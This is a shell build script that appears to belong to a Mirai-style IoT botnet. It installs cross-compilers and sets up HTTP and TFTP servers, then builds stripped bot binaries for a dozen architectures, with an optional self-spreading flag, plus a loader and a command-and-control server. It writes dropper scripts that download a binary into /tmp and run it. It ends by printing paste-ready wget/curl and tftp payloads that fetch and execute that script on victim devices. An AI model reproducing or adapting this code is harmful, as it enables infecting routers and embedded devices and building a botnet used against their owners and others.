
dir="bot/*.c"
binname="miori" #dont touch this.
serverip=$(curl https://ipinfo.io/ip -q) #dont touch this.
execname="chiemi" #name of bin when exec.

function arc_compile {
    "$1-linux-gcc" -DSHIRO_BOT_ARCH="$1" $dir -s -o release/"$2"
}
function arm7_compile {
    "$1-gcc" -DSHIRO_BOT_ARCH="$1" $dir -s -o release/"$2"
}
function compile_bot {
    "$1-gcc" $3 $dir -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DSHIRO_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}	

    if [ "$1" == "dp" ]; then
	echo "downloading dependencies may take a bit."
	yum update -y &>/dev/null
	yum install gcc screen nano wget xinetd tftp tftp-server wget httpd  bzip2 glibc-static -y &>/dev/null
	service httpd start &> /dev/null
	echo -e "
    service tftp
    {
            socket_type             = dgram
            protocol                = udp
            wait                    = yes
            user                    = root
            server                  = /usr/sbin/in.tftpd
            server_args             = -s -c /tftpboot
            disable                 = no
            per_source              = 11
            cps                     = 100 2
            flags                   = IPv4
    }
    " > /etc/xinetd.d/tftp
	mkdir /tftpboot &> /dev/null
    chmod -R 777 /tftpboot
    chown -R nobody /tftpboot
	service xinetd restart &> /dev/null
	echo "getting archs and setting up will take a bit."
mkdir /etc/xcompile &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2 &>/dev/null
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2 &>/dev/null
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2 &>/dev/null
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv5l.tar.bz2 &>/dev/null
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2 &>/dev/null
wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz &>/dev/null
tar -jxf cross-compiler-x86_64.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz &>/dev/null
rm -rf *.tar.bz2
rm -rf *.tar.gz
mv cross-compiler-x86_64 /etc/xcompile/x86_64
mv cross-compiler-m68k /etc/xcompile/m68k
mv cross-compiler-mips /etc/xcompile/mips
mv cross-compiler-mipsel /etc/xcompile/mipsel
mv cross-compiler-powerpc /etc/xcompile/powerpc
mv cross-compiler-sh4 /etc/xcompile/sh4
mv cross-compiler-i586 /etc/xcompile/i586
mv cross-compiler-i686 /etc/xcompile/i686
mv cross-compiler-sparc /etc/xcompile/sparc
mv cross-compiler-armv4l /etc/xcompile/armv4l
mv cross-compiler-armv5l /etc/xcompile/armv5l
mv cross-compiler-armv6l /etc/xcompile/armv6l
mv cross-compiler-armv7l /etc/xcompile/armv7l
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install /etc/xcompile/arc
else
echo -ne ""
fi


export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/arc/bin

rm -rf release
mkdir release &>/dev/null
mkdir /var/www/html/gaybub &>/dev/null

if [ "$1" == "rep" ] || [ "$2" == "rep" ]; then

compile_bot x86_64 $binname.x86 "-static -DREP_SENPAI"
compile_bot mips $binname.mips "-static -DREP_SENPAI"
compile_bot mipsel $binname.mpsl "-static -DREP_SENPAI"
compile_bot armv4l $binname.arm "-static -DREP_SENPAI"
compile_bot armv5l $binname.arm5 "-static -DREP_SENPAI"
compile_bot armv6l $binname.arm6 "-static -DREP_SENPAI"
arm7_compile armv7l $binname.arm7 "-static -DREP_SENPAI"
compile_bot powerpc $binname.ppc "-static -DREP_SENPAI"
compile_bot sparc $binname.spc "-static -DREP_SENPAI"
compile_bot m68k $binname.m68k "-static -DREP_SENPAI"
compile_bot sh4 $binname.sh4 "-static -DREP_SENPAI"
arc_compile arc $binname.arc "-static -DREP_SENPAI"
else
compile_bot x86_64 $binname.x86 "-static"
compile_bot mips $binname.mips "-static"
compile_bot mipsel $binname.mpsl "-static"
compile_bot armv4l $binname.arm "-static"
compile_bot armv5l $binname.arm5 "-static"
compile_bot armv6l $binname.arm6 "-static"
arm7_compile armv7l $binname.arm7 "-static"
compile_bot powerpc $binname.ppc "-static"
compile_bot sparc $binname.spc "-static"
compile_bot m68k $binname.m68k "-static"
compile_bot sh4 $binname.sh4 "-static"
arc_compile arc $binname.arc "-static"
fi

cp release/$binname.* /var/www/html/gaybub
cp release/$binname.* /var/www/html
cp release/$binname.* /tftpboot
echo "binarys=\"mips mpsl sh4 ppc x86 arc arm7 arm6 arm5 arm\"
server_ip=\""$serverip"\"
binname=\""$binname"\"
execname=\""$execname"\"

for arch in \$binarys
do
cd /tmp
wget http://\$server_ip/\$binname.\$arch -O \$execname
chmod 777 \$execname
./\$execname \$1
rm -rf \$execname
done" > /var/www/html/sh

echo "binarys=\"mips mpsl sh4 ppc x86 arc arm7 arm6 arm5 arm\"
server_ip=\""$serverip"\"
binname=\""$binname"\"
execname=\""$execname"\"

for arch in \$binarys
do
cd /tmp
tftp -g -l \$execname -r \$binname.\$arch \$server_ip
chmod 777 \$execname
./\$execname \$1
rm -rf \$execname
done" > /tftpboot/sh

armv4l-gcc -Os -D OTHER -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.arm
armv5l-gcc -Os -D OTHER -D BOT_ARCH=\"arm5\" -D ARM6 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.arm5
armv6l-gcc -Os -D OTHER -D BOT_ARCH=\"arm6\" -D ARM6 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.arm6
armv7l-gcc -Os -D OTHER -D BOT_ARCH=\"arm7\" -D ARM7 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.arm7
x86_64-gcc -Os -D OTHER -D BOT_ARCH=\"x86\" -D X86 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.x86
m68k-gcc -Os -D OTHER -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.m68k
mips-gcc -Os -D OTHER -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.mips
mipsel-gcc -Os -D OTHER -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.mpsl
powerpc-gcc -Os -D OTHER -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.ppc
sh4-gcc -Os -D OTHER -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.sh4
sparc-gcc -Os -D OTHER -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.spc
arc-linux-gcc -Os -D ARCC -D BOT_ARCH=\"arc\" -D ARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static dlr/main.c -o ll/bins/dlr.arc


armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.arm7
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ll/bins/dlr.spc
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=.got ll/bins/dlr.arc
echo "loli" > ll/bins/dlr.sh

gcc -static -O3 -lpthread -pthread ll/src/*.c -o ll/loader
gcc cnc/cnc.c -o cnc/c2 -pthread

echo "Wget/Curl Payload: cd /tmp || cd /dev || cd /mnt || cd /var; wget http://"$serverip"/sh; curl -O http://"$serverip"/sh; chmod 777 sh; ./sh; rm -rf sh"
echo ""
echo "Tftp payload: cd /tmp || cd /dev || cd /mnt || cd /var; tftp "$serverip" -c get sh; tftp -r sh -g "$serverip"; chmod 777 sh; ./sh; rm -rf sh"